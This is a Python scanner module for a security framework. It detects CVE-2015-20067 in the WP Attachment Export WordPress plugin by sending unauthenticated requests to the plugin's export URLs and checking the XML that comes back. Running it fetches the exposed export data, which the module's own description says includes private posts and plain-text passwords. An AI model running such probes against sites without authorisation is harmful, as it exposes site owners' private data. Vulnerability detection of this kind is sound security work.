#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The plugin does not have proper access controls, allowing unauthenticated users to download the XML data that ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP Attachment Export < 0.2.4 - Unrestricted File Download Detection',
        'description': 'The plugin does not have proper access controls, allowing unauthenticated users to download the XML data that holds all the details of attachments/posts on a Wordpress powered site. This includes details of even privately published posts and password protected posts with their passwords revealed in plain text.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web',
            'scanner',
            'cve',
            'wpscan',
            'packetstorm',
            'seclists',
            'cve2015',
            'wordpress',
            'wp',
            'wp-plugin',
            'unauth',
            'wp-attachment-export',
            'wp_attachment_export_project',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/d1a9ed65-baf3-4c85-b077-1f37d8c7793a',
            'https://packetstormsecurity.com/files/132693/',
            'https://seclists.org/fulldisclosure/2015/Jul/73',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-20067',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2015-20067',
    }

    def run(self):
        for path in ('/wp-admin/tools.php?content=attachment&wp-attachment-export-download=true', '/wp-admin/tools.php?content=&wp-attachment-export-download=true'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('wp:author_id', 'wp:author_email')
            header_any = ('text/xml',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="WP Attachment Export < 0.2.4 - Unrestricted File Download detected",
                    path=path,
                )
                return True
        return False

